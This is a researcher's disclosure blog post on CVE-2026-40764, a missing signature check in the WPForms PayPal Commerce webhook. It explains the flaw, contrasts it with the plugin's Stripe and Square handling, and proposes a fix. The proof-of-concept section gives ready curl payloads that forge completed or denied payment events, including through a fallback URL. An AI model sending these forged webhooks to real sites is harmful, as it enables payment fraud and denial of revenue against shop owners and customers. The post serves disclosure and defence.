---
title: "10 people found my bug before me: the wpforms paypal webhook (cve-2026-40764)"
date: 2026-05-11
tags: ["security", "wordpress", "webhooks", "paypal", "disclosure", "vulnerability-management", "blog"]
author: "Himanshu Anand"
---

## TLDR

WPForms Lite is a WordPress form plugin with around 6 million active installs. Versions 1.10.0.1 through 1.10.0.4 ship a PayPal Commerce webhook handler that accepts events from anyone on the internet. No signature check. No shared secret. No callback to PayPal. Send a forged JSON body to `/wp-json/wpforms/ppc/webhooks` and you can flip any pending order from "processed" to "completed", which fires every downstream action the site has set up: digital downloads, license key emails, membership grants, CRM integrations, custom hooks. You can also send a `PAYMENT.CAPTURE.DENIED` event for a real order and mark a paying customer as failed.

The same plugin verifies Stripe and Square webhooks correctly. Only PayPal got the trust-by-default treatment. CVE-2026-40764. Reported by 11 of us in 6 weeks. I was reporter number 11.

## where this post fits

If you read [my last post on the death of the 90 day disclosure policy](https://blog.himanshuanand.com/2026/05/the-90-day-disclosure-policy-is-dead/), you saw story 1: I found a bug, sent it in, the triage team said "you are reporter eleven". I left the technical details vague because the issue was not fixed at the time. The CVE has since been assigned and the vendor pushed a patch release. So now I can tell the full story. This is the "10 people found my bug before me" follow up I promised.

## the story (the one I hinted at)

Late April 2026. I was poking at WordPress plugins, looking at payment integrations specifically. Payment code is interesting because the security cost of a bug is real money, the attack surface is usually public and the developers often glue together third party SDKs in ways that miss something important. WPForms is one of the biggest form plugins on WordPress so I figured the code would be well audited. It mostly is.

Mostly.

I opened the PayPal Commerce integration folder and grep'd for `permission_callback`. That is the WordPress way of saying "who is allowed to hit this endpoint". I was looking for the usual mistakes. Within about 90 seconds I had this:

```php
register_rest_route(
    'wpforms/ppc',
    '/webhooks',
    [
        'methods'             => 'POST',
        'callback'            => [ $this, 'dispatch_paypal_webhooks_payload' ],
        'permission_callback' => '__return_true',   // <- anyone
    ]
);
```

`__return_true`. The endpoint is open to the world. Now this by itself is not a bug. Webhook endpoints have to be open. PayPal cannot log in to your WordPress site. The bug is what happens after the request lands.

I followed the callback. The handler reads the raw body, parses JSON, checks the event type against a public allowlist and then hands the payload to the appropriate handler. Nowhere in that chain does it ever check the `Paypal-Transmission-Sig` header. Nowhere does it call PayPal's verify-webhook-signature endpoint. Nowhere does it do anything with the webhook ID that the plugin admin had carefully configured in settings.
I built a one liner curl command. I tested it on a local install. It worked first try. The order in my test database flipped from `processed` to `completed`. The "thank you for your payment" email fired. The configured Slack notification went out. The download link went live. Cool. I wrote it up. I sent it in. I felt good about myself for about 10 minutes.
Then the triage email came back. Yeah, they knew. First reported March 1st. I was reporter eleven.

![reporter 11 of 11](/images/11_submittions.png)

*the moment you realize 10 other people beat you to the same bug. yes I screenshotted it. yes it stings. the previous post talked about this exact pattern, this is the bug behind that story.*
I went back to the date math. The bug was sitting in production code that was already in 1.10.0.1 (released February). First report March 1st. Final patch in 1.10.0.3 (April). My report late April. Patches landed but the actual underlying issue is still present in 1.10.0.4 because the "fix" addressed the CSRF symptom and not the missing webhook signature verification root cause. So the bug is in some form alive in the latest stable as of writing.
That last bit deserves a paragraph of its own. Patchstack classified CVE-2026-40764 as "Cross Site Request Forgery". Which is true in the loose sense that an attacker forges a request the server treats as legitimate. But the underlying primitive is missing webhook authentication, which is a different beast. CSRF lives on the assumption that the server trusts the browser session. Missing webhook auth lives on the assumption that the server trusts the network. The fixes look completely different. If the vendor treats it as a CSRF and ships a nonce or origin check, the nonce or origin check fires only on cross origin browser requests. An attacker hitting the endpoint with curl from a script does not care.
That is exactly what seems to have happened here. I will keep responsibly nudging on the verification side until it is properly addressed.

## quick refresher: what a webhook is and why it needs a signature

If you already write webhooks for a living, skip this section. If not, stay with me, because once you understand the model the bug becomes obvious.
A webhook is a callback over HTTP. Service A wants to tell Service B that something happened. Maybe PayPal wants to tell WordPress that a customer just paid. The naive way to do this would be for WordPress to keep asking PayPal "did anything new happen?" every few seconds. That is called polling and it is wasteful. The smarter way is for PayPal to call WordPress when something happens. That is a webhook.
The mechanics are simple. WordPress exposes a URL. PayPal makes an HTTP POST to that URL with a JSON body describing the event. WordPress reads the body, does something useful, returns 200 OK. Done.

The problem: the URL has to be public. Public means anyone on the internet can reach it. So if WordPress just trusts whatever shows up at that URL, then anyone can pretend to be PayPal.

Every webhook provider knows this. So every webhook provider gives you a way to verify the source. There are two common patterns.

**HMAC signatures.** The provider has a secret shared with the receiver. When they send a webhook, they compute an HMAC of the body using that secret and put it in a header. The receiver recomputes the HMAC, compares the two, accepts the request only if they match. Stripe does this with the `Stripe-Signature` header. Square does this with `X-Square-HmacSha256-Signature`. This pattern is fast, stateless and well understood.

**Public key signatures.** The provider signs the body with a private key. The signature, plus information about which certificate signed it, goes in headers. The receiver fetches the public certificate and verifies the signature cryptographically. PayPal uses this pattern with `Paypal-Transmission-Sig`, `Paypal-Cert-Url`, `Paypal-Transmission-Id`, `Paypal-Transmission-Time` and `Paypal-Auth-Algo` headers. The receiver also has the option to call PayPal's `/v1/notifications/verify-webhook-signature` endpoint and let PayPal do the validation server side.

Either pattern, the rule is the same: if you do not verify, you do not trust. A webhook handler that does not verify is just a public API endpoint that mutates payment state. That is what we have here.

Here is the asymmetry in one picture.

```
================================================================
  HOW IT SHOULD WORK (stripe, square, properly built webhooks)
================================================================

  [Anyone]    --POST body, no signature-->   [Server]
                                                 |
                                                 v
                                            verify signature?  FAIL
                                                 |
                                                 v
                                            403, no DB change


  [PayPal]    --POST body + signature-->     [Server]
                                                 |
                                                 v
                                            verify signature?  PASS
                                                 |
                                                 v
                                            update DB, fire hooks


================================================================
  HOW WPFORMS DOES IT (paypal commerce integration only)
================================================================

  [Anyone]    --POST forged JSON-->          [Server]
                                                 |
                                                 v
                                            json_decode( body )
                                            check event_type (public allowlist)
                                            check status   (attacker controlled)
                                            check amount   (public on the form)
                                                 |
                                                 v
                                            update DB, fire hooks
                                            "money moves"
```

The top block is how every webhook in the world is supposed to work. The bottom block is what the WPForms PayPal handler actually does. The server cannot tell `[Anyone]` apart from `[PayPal]` because it never looks at the signature header. The "checks" it does perform are all things the attacker controls or can read from the public form.

## the wpforms paypal webhook in one paragraph

The WPForms PayPal Commerce integration registers a REST route at `/wp-json/wpforms/ppc/webhooks` with `permission_callback => '__return_true'`. The same handler is reachable via a fallback URL parameter at `/?wpforms_paypal_commerce_webhooks=1`, so even sites that disable the WP REST API are still exposed. The handler reads the request body, JSON decodes it, checks the event type against a public allowlist and dispatches to a per-event-type handler. The `PAYMENT.CAPTURE.COMPLETED` handler flips the matching row in `wp_wpforms_payments` from `processed` to `completed` and fires every downstream "on completed payment" action. None of the verification steps PayPal documents for webhooks are performed.

## the missing check (the whole bug in 6 lines)

Here is the diff that would have prevented this. Six lines.

```php
$expected = $_SERVER['HTTP_PAYPAL_TRANSMISSION_SIG'] ?? '';
$webhook_id = wpforms_setting( 'paypal-commerce-webhooks-id-' . $mode );

if ( ! $this->verify_with_paypal( $expected, $this->payload, $webhook_id ) ) {
    return new WP_REST_Response( [ 'error' => 'invalid signature' ], 403 );
}
```

That is the whole bug. The absence of those six lines is what makes the endpoint exploitable. Everything else in the report, every check, every state transition, every downstream side effect, all of it follows from "we trust the network".

## the four placebo checks that do not save you

When I sent the report, I expected the response to argue back. Vendors usually do. They usually point at some check in the code path and say "see, we do validate, the attacker cannot just forge anything". WPForms has four such checks. None of them help.

| Check | Where | Why it does not stop an attacker |
|-------|-------|----------------------------------|
| `event_type` allowlist | `WebhookRoute.php:188` | The allowlist values are hardcoded in `get_event_whitelist()`. Anyone can read them. The attacker picks `PAYMENT.CAPTURE.COMPLETED` and moves on. |
| `db_payment->status === 'processed'` | `PaymentCaptureCompleted.php:34` | This is the natural pending state of any payment that has not completed yet. Every abandoned or in flight checkout creates one. The attacker just needs one pending payment to exist, which is the default situation for any active shop. |
| `$this->data->status === 'COMPLETED'` | `PaymentCaptureCompleted.php:34` | This compares against the JSON body, which the attacker controls. Putting `"status": "COMPLETED"` in the payload satisfies the check. |
| `$amount === $db_amount` | `PaymentCaptureCompleted.php:41` | The amount is the form's payment total, which is public on the form. The attacker reads it from the form and echoes it back in the forged payload. |

These checks restrict which payment row the attacker can target. They do not check whether the request actually came from PayPal. That is the whole point of webhook signature verification. The first four checks ask "is this request valid in shape". The missing fifth check asks "is this request actually from PayPal". The first four checks have nothing to say about that.

![security theater meme: airport screening but they only check your ticket spelling](/images/airport.png)

*if you have to spell PAYMENT.CAPTURE.COMPLETED correctly to forge a payment, that is not security. that is a spell check.*

There is a subtle one I want to call out separately because it makes the impact worse. Inside the webhook dispatcher base class, `Base.php:65` forces the `wpforms_current_user_can` filter to `__return_true` for the duration of the webhook processing. The intent makes sense: webhooks run without a user context so any capability checks in downstream code would block legitimate webhooks. The side effect is that during a forged webhook, downstream code that would normally fail a permission check now sails right through. The forged event runs with effective admin trust.

## proof of concept

The exploit is one curl command. Replace `TARGET`, `<PAYPAL_CAPTURE_ID>` and `<AMOUNT>` with values for the target payment.

Step 1: confirm the endpoint is open.

```bash
curl -i 'https://TARGET/wp-json/wpforms/ppc/webhooks?verify=1'
```

If you get `HTTP/1.1 200 OK` with body `{"success":true,"data":null}`, the route is registered with no permission gate. Good. We are live.

Step 2: forge a completed payment.

```bash
curl -i -X POST 'https://TARGET/wp-json/wpforms/ppc/webhooks' \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "event_type": "PAYMENT.CAPTURE.COMPLETED",
    "resource": {
      "id": "<PAYPAL_CAPTURE_ID>",
      "status": "COMPLETED",
      "amount": {
        "value": "<AMOUNT>",
        "currency_code": "USD"
      }
    }
  }'
```

The request has no `Paypal-Transmission-Id`, no `Paypal-Transmission-Sig`, no `Paypal-Transmission-Time`, no `Paypal-Cert-Url` and no `Paypal-Auth-Algo`. A genuine PayPal webhook would contain all five. None of these are checked, validated or even read by the plugin.

Server response: `HTTP/1.1 200 OK` with body `WPForms PayPal: PAYMENT.CAPTURE.COMPLETED event received.`

State change in the database: the row identified by `transaction_id = <PAYPAL_CAPTURE_ID>` moves from `status = 'processed'` to `status = 'completed'`. A log entry is appended to `wp_wpforms_payment_meta` saying "PayPal Commerce payment was completed.". All "on completed payment" hooks fire. Email notifications go out. CRM integrations sync. Conditional logic actions execute. License keys get mailed. Downloads unlock. The world thinks money changed hands.

![terminal screenshot of the curl request and the 200 OK response](/images/response.png)

*the exploit, in one screen. left side is the forged curl. right side is the database showing status going from processed to completed. no PayPal involved anywhere in this conversation.*

Step 3 (the mean version): downgrade a real paying customer to denied.

```bash
curl -i -X POST 'https://TARGET/wp-json/wpforms/ppc/webhooks' \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "event_type": "PAYMENT.CAPTURE.DENIED",
    "resource": {
      "id": "<PAYPAL_CAPTURE_ID_OF_REAL_PAYMENT>",
      "status": "DENIED"
    }
  }'
```

That handler flips a real paid order to failed. The customer paid. The shop owner thinks they did not. Refund automation kicks in. Trust is broken. This is a DoS against actual revenue.

## the fallback url that does not need the rest api

Some WordPress hardening guides recommend disabling the REST API for unauthenticated users. WPForms anticipated that. The plugin registers a fallback route that is triggered by a URL parameter:

```bash
curl -i -X POST 'https://TARGET/?wpforms_paypal_commerce_webhooks=1' \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "event_type": "PAYMENT.CAPTURE.COMPLETED",
    "resource": {
      "id": "<PAYPAL_CAPTURE_ID>",
      "status": "COMPLETED",
      "amount": {"value": "<AMOUNT>", "currency_code": "USD"}
    }
  }'
```

Same handler. Same lack of verification. Same outcome. So the "disable REST API" mitigation that lots of WordPress shops apply does not help here.

This is a small but important lesson. When you build a fallback path, the fallback path needs the same security as the primary path. Every time. No exceptions. A fallback that skips the primary path's checks is not a fallback. It is a backdoor.

## the same plugin gets stripe and square right

Here is the part that makes the bug feel weirdest. WPForms knows how to verify webhooks. They do it for Stripe. They do it for Square. They just did not do it for PayPal.

The clearest way to see it is to put the two handlers side by side. Both files live in the same plugin. Both register a public webhook route with `permission_callback => '__return_true'`. Both read the raw body the same way. What happens after that line is the whole bug.

```diff
# both files start identical:
  $this->payload = file_get_contents( 'php://input' );

# ─── src/Integrations/Stripe/Api/WebhookRoute.php:170 ──────────────
+ $event = Webhook::constructEvent(
+     $this->payload,
+     $this->get_webhook_signature(),       // reads HTTP_STRIPE_SIGNATURE
+     $this->get_webhook_signing_secret()
+ );
+ // throws SignatureVerificationException on a bad signature
+ // caught at line 196 and rejected with HTTP 403

# ─── src/Integrations/PayPalCommerce/Api/WebhookRoute.php:170 ──────
- // no Paypal-Transmission-Sig header read
- // no webhook id retrieved from wpforms_setting()
- // no call to /v1/notifications/verify-webhook-signature
- // no rejection path for unsigned requests
  $event = json_decode( $this->payload );    // straight to the dispatcher
```

The green lines are what Stripe has. The red lines are what PayPal is missing. The unchanged line at the top is what both do. That gap is the entire exploitable surface.

Square gets it right too. `Square/Api/WebhookEvent.php:29` calls `WebhooksHelper::isValidWebhookEventSignature()` against the `X-Square-HmacSha256-Signature` header and returns 403 on failure. Same pattern, different header name. So the asymmetry is not Stripe vs the rest. It is PayPal vs every other payment provider in the same plugin.

Two integrations get this right. One does not. That asymmetry is the strongest hint that this was an oversight rather than a design choice. Someone wrote the PayPal integration in a hurry, copied the route registration pattern but forgot to copy the verification pattern. The tests passed because PayPal genuinely calls the endpoint with valid bodies and the bodies look fine. Nobody tested the case where the caller is not PayPal.

This pattern shows up in a lot of plugins. Multiple payment integrations, two of them verify, one of them does not. Worth grepping for if you do plugin auditing.

## the suggested fix

PayPal documents the verification flow [here](https://developer.paypal.com/api/rest/webhooks/rest/#link-verifywebhooksignature). The shape of the fix:

```php
// In dispatch_paypal_webhooks_payload(), before json_decode:
$headers = [
    'auth_algo'         => $_SERVER['HTTP_PAYPAL_AUTH_ALGO']         ?? '',
    'cert_url'          => $_SERVER['HTTP_PAYPAL_CERT_URL']          ?? '',
    'transmission_id'   => $_SERVER['HTTP_PAYPAL_TRANSMISSION_ID']   ?? '',
    'transmission_sig'  => $_SERVER['HTTP_PAYPAL_TRANSMISSION_SIG']  ?? '',
    'transmission_time' => $_SERVER['HTTP_PAYPAL_TRANSMISSION_TIME'] ?? '',
];

if ( ! $this->verify_webhook_signature( $headers, $this->payload, $this->get_webhook_id() ) ) {
    return new WP_REST_Response( [ 'error' => 'invalid signature' ], 403 );
}
```

`verify_webhook_signature` calls PayPal's `/v1/notifications/verify-webhook-signature` endpoint with the stored webhook ID (retrieved from `wpforms_setting('paypal-commerce-webhooks-id-' . $mode)`). PayPal verifies the signature against its own certificate chain and returns `SUCCESS` or `FAILURE`. The handler rejects anything that is not `SUCCESS`.

If you want to do it locally without the round trip, you can verify the signature against the PayPal certificate offline. PayPal documents the offline verification flow too. Either works. The point is to verify, somehow, with the actual signature material, against PayPal's published trust anchor.

## what 10 duplicate reports actually means

This bug got reported by 11 of us in 6 weeks. Let me stop and think about what that number actually tells us.

The vendor sees 11 unrelated researchers, all reporting the same root cause, in totally different words, through different intake channels, some using AI assistance and some not. The bug was sitting in production for around 8 weeks before the first report. If the rate of independent discovery is roughly one researcher per 4 to 5 days for the entire period, then in the time before the first report it is reasonable to assume at least 4 to 5 finders existed who did not report. Or sold instead. Or sat on it. Or were attackers who used it quietly.

The probability that everyone who finds a bug like this reports it is zero. The actual base rate for "researchers who find a bug and report it" versus "people who find a bug and do something else" is unknown but it is definitely not 100%. Reasonable estimates I have seen from people who do triage at scale put the report rate somewhere between 10% and 50% depending on the bug class, the bounty, the program's friendliness and the researcher's personal incentives. If you take the optimistic 50% rate, then 11 reports means roughly 22 finders. If you take the more pessimistic 20% rate, it is more like 55 finders.

Now read the previous paragraph again with attacker incentives in mind. A bug like this one prints money. It does not need elevated access. It runs against any site with a PayPal integration. There is no exotic primitive to chain. There is no exploit dev cost. The cost of "finding and using" this bug is the same as the cost of "finding and reporting" it, minus the time spent writing a polite email to the vendor.

This is the part of the 90 day disclosure model that I keep coming back to. The model assumes the people finding a bug are mostly the same set as the people reporting it. The model assumes the gap between "first find" and "second find" is large enough that the vendor's patch can ship before the second person knows. Neither assumption holds anymore.

If 11 of us found the same bug in 6 weeks, the right question is not "why so many duplicates", it is "where are the other ones".

![iceberg meme: 11 reporters above water, unknown attackers and unreported finders below](/images/iceberg.jpg)

*the 11 of us who reported are the part above the waterline. the part below the waterline is the people who found the same bug and chose to do something else with it. nobody knows how big that part is. that is the problem.*

## lessons for bug finders

For people who do this kind of work, a few things I want to put in writing.

**Grep for `permission_callback` first.** In WordPress plugin audits, this is the single most productive grep you can run. `__return_true` is the WordPress equivalent of "no auth". Every match deserves a look at what the callback does. If the callback mutates state, you might be five minutes away from a finding.

**Look for asymmetries inside one project.** If a plugin verifies Stripe webhooks but not PayPal webhooks, that asymmetry is a bug shape. Same logic applies to any pair of "the same kind of thing done two different ways". File downloads handled one way in one route and a different way in another. User input validated in one form and not the other. Authentication checks present in one endpoint and missing in the next. Project internal asymmetries are gold.

**Fallback paths deserve their own audit.** Every time you find a security check in the main path, look for a fallback that skips it. Plugins love fallbacks. URL parameters, query strings, alternate endpoints, legacy compatibility shims. The fallback is often where the careful path's checks got forgotten.

**Filters that override permissions are landmines.** When you see something like `add_filter('wpforms_current_user_can', '__return_true')` inside a code path, that path is running with elevated trust. Anything that lands in that path bypasses capability checks. Map every entry point that reaches it.

**The CVE classification might not match the actual bug.** Reporters do not always control how the bug gets classified in public databases. If the public advisory describes your bug as a CSRF and your bug is actually missing webhook auth, the patch the vendor ships might address the CSRF interpretation and leave the actual bug alive. Test the patch yourself. Do not assume "patched in 1.10.0.3" means "your bug is closed". Re-run the proof of concept. Verify. The CVE database is not your QA team.

**Submit anyway, even when it is a dupe.** I am reporter 11 and I will probably get zero credit on the CVE and zero bounty money. That is fine. The signal to the vendor of "10 of us think this is critical, plus reporter 11" is more useful than 10 alone. Vendors do prioritize by report count. Show up.

## lessons for vendors

A few things for the receiving side.

**Webhook handlers are payment infrastructure. Treat them like it.** Anything that mutates payment state is at the same security tier as your card processing logic. The fact that the endpoint is "just a webhook" does not lower the bar. Webhook endpoints are public, they mutate database state, they fire side effects. They are payment infrastructure. They get the same review.

**Build a verification helper once, use it everywhere.** Every payment integration in a plugin should call into a single `verify_webhook_signature($provider, $headers, $body)` helper that knows how to verify for each provider. If a new integration ships without a call to that helper, the security review should reject the patch. This is not glamorous work but it is the work.

**Document your fallback URLs in the threat model.** If you have a fallback path for sites that disable the REST API, write down what it does and what it skips. Run the same security checks against the fallback that you run against the primary route. Add a test that proves the fallback rejects invalid signatures.

**Beware of filters that elevate trust.** `wpforms_current_user_can` forced to `__return_true` is a useful primitive for letting webhooks run without a user context, but anything that lands in that scope is now running with admin trust. Audit every entry point that ends up in that filter scope. Make sure the entry point itself is properly authenticated before you give it free run of the capability system.

**Test the patch by re-running the original PoC.** I know this sounds obvious. It is not obvious enough. Patches that fix a CSRF interpretation of a webhook bug do not fix the underlying webhook auth gap. Re-run the original PoC against the patched build. If it still works, the patch is incomplete. Ship a new one.

## final thoughts

This bug is small. The fix is six lines. The CVSS is 8.1 and Patchstack rated the priority as Low because the exploit needs a transaction ID and a payment in a pending state. That is fair on a generic 1 in 100 site. It is not fair on a high traffic shop that processes pending transactions every minute. Threat models depend on the site.

What this bug is not small in is what it tells us about the industry. The plugin is in 6 million installs. The asymmetry with Stripe and Square is visible to anyone who reads the source for ten minutes. The bug class is one of the oldest in the webhook world. The number of duplicate reports is the kind of number that should stop traffic. And the patch that shipped under the CVE addressed the symptom and not the cause.

Same theme as my last post. The old assumptions are not holding. If 11 of us can find the same bug in 6 weeks using totally unrelated tools, and the vendor can ship a patch under a CVE that does not actually fix the root cause, then the public disclosure system is leaving real risk on the table. Not in some hypothetical sense. In the sense that the latest stable release as of this writing still has the underlying gap.

I will keep nudging the vendor to ship a full fix. In the meantime, if you run a site using WPForms PayPal Commerce, monitor your payments table for unexpected status transitions. Look for `processed -> completed` events that did not come with the corresponding `Paypal-Transmission-Sig` header in your webhook logs. Look for `PAYMENT.CAPTURE.DENIED` events that turned real customers into refunds. If you do not log webhook headers, start now.

And if you are a security researcher who already found this and never reported it because you assumed someone else would, well. You were right. Ten other people did. Report the next one.

If you are still reading this, you are awesome. Thanks for sticking with me.

---

related posts:

- [the 90 day disclosure policy is dead](https://blog.himanshuanand.com/2026/05/the-90-day-disclosure-policy-is-dead/) (the framing post for this one)

references:

- [CVE-2026-40764](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-40764)
- [Patchstack advisory](https://patchstack.com/database/wordpress/plugin/wpforms-lite/vulnerability/wordpress-contact-form-by-wpforms-plugin-1-10-0-2-cross-site-request-forgery-csrf-vulnerability)
- [WPForms changelog](https://wordpress.org/plugins/wpforms-lite/#developers)
- [PayPal webhook signature verification docs](https://developer.paypal.com/api/rest/webhooks/rest/#link-verifywebhooksignature)

If any of this resonated, hit me up on Twitter/X ([https://x.com/anand_himanshu](https://x.com/anand_himanshu)). If you disagree, especially hit me up.

Thanks for reading.
